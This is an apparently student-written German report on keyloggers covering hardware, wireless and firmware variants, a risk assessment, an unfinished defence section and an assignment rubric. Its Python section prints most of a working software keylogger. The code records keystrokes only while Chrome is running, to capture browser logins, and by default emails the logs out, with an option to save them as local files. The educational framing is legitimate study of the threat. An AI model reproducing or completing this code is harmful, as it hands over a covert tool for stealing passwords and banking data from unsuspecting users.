## Gliederung

* Begriffsdefinition
* Vergleich unterschiedlicher Key-Logger
  * Drahtgebundene Hardware-Keylogger
  * Drahtlose Hardware-Keylogger
  * Firmenware Keylogger 
  * Software Keylogger Beispiel in Python 
* Gafahrenbewertung 
* Schutz vor Keylogger 



# Begriffsdefinition 

## Drahtgebundene Hardware-Keylogger

Drahtgebunde Hardware-Keylogger sind Geräte, die zwischen der Tastatur und dem Rechner platziert werden. Der Hardware-Keylogger agiert dann als *"Man-in-the Middle"*. Das bedeutet, sämtliche Daten, die von der Tastatur an den Rechner versendet werden, durchqueren den Keylogger und können dadurch von dem Keylogger gespeichert oder über ein Netzwerk versendet werden. 
Auf der Website *keelog.com* können solche Hardware-Keylogger für 32 Euro erworben werden (Stand 2022). Die Seite wirbt mit einem 16GB großen Speicher, Kompatibilität mit  Windows, Linux und MacOS ohne zusätzliche Treiber und das Der Keylogger vom Rechner nicht detektiert werden kann.

## Drahtlose Keylogger

Viele Tastaturen benötigen keine physische Verbindung mit dem Rechner um Daten zu übertragen. Stattdessen findet die Datenübertragung über Funkwellen wie Bluetooth statt. Die drahtlose Übertragung kann somit nicht durch ein Hardware-Keylogger inspiziert werden. 
Bei der Tastatur handelt es sich jedoch um ein *Broadcast-Medium*, das bedeutet, die Tastatur versendet die Daten mithilfe von Elektromagnetischen Wellen in den gesamten Raum. Diese Wellen können von jedem Gerät in Reichweite der Tastatur gelesen werden. Damit die Daten der Tastatur somit nicht von dritten gelesen werden können ist es essentiell, das diese verschlüsselt werden. Marc Newlin aus dem Bastille Research Team hat bei Untersuchungen jedoch festgestellt, das besonders bei Preiswerten drahtlosen Tastaturen keine Verschlüsselung der Daten erfolgt [Newlin]. Durch die unverschlüsselte Übertragung entsteht neben dem Lesen von Daten eine weiter Sicherheitslücke. Ist das Übertragungsprotokoll zwischen Tastatur und Rechner bekannt, so kann der Angreifer auch Daten an den Rechner senden, der Angreifer kann somit Eingaben auf dem Rechner des Angegriffenen durchführen ohne einen direkten physischen Zugang zu dem Rechner zu besitzen. 
Einige Tastaturen verfügen über ein USB-Dongle, der an den Rechner angeschlossen wird und somit die Übertragung ermöglicht. Viele dieser Dongles übertragen in periodischen Zeitabständen Datenpakete. Ein Angreifer ist durch diese Datenpakete in der Lage ein Gebiet nach möglichen Schwachstellen zu Scannen. Die Verwendung von Verstärkern ermöglicht auch ein Scannen außerhalb von Bürogebäuden. 


## Firmware-Keylogger

Bei Firmware-keyloggern wird die Software der Tastatur um eine schadhafte Komponente erweitert. Diese Komponente könnte dann die Tastatureinschläge auch an den Angreifer weiterleiten. Auf der IT-Sicherheitskonferenz im Jahr 2009 hat K.Chen das Konzept anhand einer Apple-Tastatur erläutert [Chen]. In der Praxis sind jedoch keine größeren Angriffe durch Firmware-Keylogger publik geworden [Hessel].

## Software Keylogger Beispiel in Python

In dem Folgenden Beispiel wird gezeigt wie ein Keylogger in der Programmiersprache Python implementiert werden kann. Das erstellte Skript ist in der Lage die Tastatureinschläge des Nutzers zu registrieren und in einer globalen `String` Variable zu speichern. In einem Periodischem Abstand wird der Inhalt dieser Variable in einer Datei gespeichert.

Um den Keylogger zu Implementieren wird das `keyboard` Modul benötigt. 
Sämtliche Funktionalitäten des Keyloggers werden in einer Klasse implementiert. Die Klasse verfügt über ein `log` Attribut, in dem die aufgenommen Tastenschläge gespeichert werden und ein `intervall` Attribut, in dem Definiert wird, in welchen Abständen der Inhalt der String Variable geteilt wird. Zusätzlich kann bei der Objektinitialisierung noch angegeben werden wie die Informationen der `log` Variable geteilt werden, standardmäßig werden die Informationen durch E-Mails verbreitet, siehe Konstruktor, wird jedoch das Schlüsselwort `file` übergeben, so wird der Inhalt in eine Datei geschrieben.

```
class Keylogger: 

  def __init__(self, interval, report_method="email"):
          # we gonna pass SEND_REPORT_EVERY to interval
          self.interval = interval
          self.report_method = report_method
          # this is the string variable that contains the log of all 
          # the keystrokes within `self.interval`
          self.log = ""
          # record start & end datetimes
          self.start_dt = datetime.now()
          self.end_dt = datetime.now()
```

Um auf ein Tastenschlag des Nutzers reagieren zu können, wird die `on_release()` Funktion des Keyboard-Modules verwendet. Die Funktion wird aufgerufen, sobald des Ereignis `KEY_UP` auftritt. Beim Aufrufen der Funktion wird eine Funktion als Parameter übergeben. Funktionen die als Parameter übergeben werden, nennt man `Callback-Funktionen`. In der Callback Funktion wird definiert, wie auf das Ereignis `KEY_UP` reagiert werden soll. 
In unserem Fall, sollen die Tastatureinschläge in der Variable `log` gespeichert werden. Hierbei werden einige Anpassungen vorgenommen, um die gespeicherten Informationen besser nutzen zu können, siehe `callback(self, event)` Funktion. Um die Datenmenge zu minimieren, werden die Laufenden Prozesse des Rechners abgefragt, und nur sobald der Browser Google Chrome aktiv ist werden die Tastatureinschläge mitgelesen. 

```
def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        if "chrome.exe" in (i.name() for i in psutil.process_iter()):
            name = event.name
            if len(name) > 1:
                # not a character, special key (e.g ctrl, alt, etc.)
                # uppercase with []
                if name == "space":
                    # " " instead of "space"
                    name = " "
                elif name == "enter":
                    # add a new line whenever an ENTER is pressed
                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
                else:
                    # replace spaces with underscores
                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"
            # finally, add the key name to our global `self.log` variable
            self.log += name
```

Nachdem die Tastatureinschläge in der `log` Variablen gespeichert wurden, müssen sie in eine lokale Datei geschrieben werden. Hierfür wurden die Methoden `update_filename(self)` und `report_to_file(self)` implementiert. Die erste Methode generiert einen Dateinamen, der sich auf den Beobachtungszeitraum bezieht. Die zweite Methode erzeugt eine Datei mit dem aus der `update_filename` Methode generierten Namen und speichert diese Datei in dem aktuellen Verzeichnis. 

```
 def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
```

Innerhalb der `report(self)` Methode werden die beiden oberen Methoden in Periodischen Zeitintervallen aufgerufen und der Inhalt der `log` Variablen wird gelöscht. 


```
def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you want to print in the console, uncomment below line
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()
```

Für übersichtlicheren Code wird die `start(self)` Methode implementiert, die  außerhalb der Klasse aufgerufen werden kann und die `on_release()` Methode und `report()` Methode aufruft. 

```
def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()
```

Die Klasse ist funktionsfähig, nach der Objekt Initialisierung und dem Aufrufen der `start` Methode werden alle Tastatureinschläge aufgezeichnet und in periodischen Abständen in Textdateien geschrieben und lokal abgespeichert. 

```
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
```
## Gafahrenbewertung 

Ein Keylogger ist einfach zu implementieren und Hardware Keylogger sind günstig zu erwerben. Hardware Keylogger stellen eine große Gefahr dar, da man sich nicht durch Software vor ihr schützen kann. Jedoch können einfache Sicherheitskonzepte wie Nachrichtenverschlüsselung die Gefahr deutlich verringern. Des Weiteren sind auch nur einige Geräte den Gefahren von Hardware Keyloggern ausgesetzt. 
Da Software Keylogger auf dem Rechner des Opfers ausgeführt werden müssen, können sie durch das Betriebssystem oder Anti Viren Programme erkannt werden. Werden sie jedoch nicht erkannt, kann dies einen erheblichen Schaden verursachen, da so sehr einfach Benutzernamen, Passwörter oder Bankdaten mitgelesen werden können. 

## Schutz vor Keylogger 

ToDO



***
## Bewertung 

- **Skizzieren Sie ein Beispiel** anhand dessen Sie die folgenden Fragen beantworten und erklären Sie kurz warum Sie speziell dieses gewählt haben:
- **Zeigen Sie die Sicherheitsaspekte** Ihres gewählten Beispiels auf und diskutieren Sie diese:
- Wählen Sie ein Szenario zu Fehlfunktion, Hack, Ausfall und beschreiben Sie die **Auswirkungen für die Betroffenen**:
- Beschreiben Sie nun Mechanismen um dem **entgegen zu wirken**, dies zu verhindern, zu erkennen, einzudämmen, darauf zu reagieren:

***

# Quellen 

[Newlin] Keysniffer technical details, Marc Newlin, Bastille Research Team, https://keysniffer.net/technical-details/


[Hessel] Hardware-Keylogger: Die Tastatur in der Hand des Feindes, Stefan Hessel,  Dipl.-Jur. Stephanie
Vogelgesang, Frederik Möllers, MSc., 2016, 
https://link.springer.com/content/pdf/10.1007/s11623-016-0692-9.pdf

[Chen] Reversing and exploiting an Apple firmware update, K. Chen, Georgia Institute of Technology, 2009, https://www.blackhat.com/presentations/bh-usa-09/CHEN/BHUSA09-Chen-RevAppleFirm-PAPER.pdf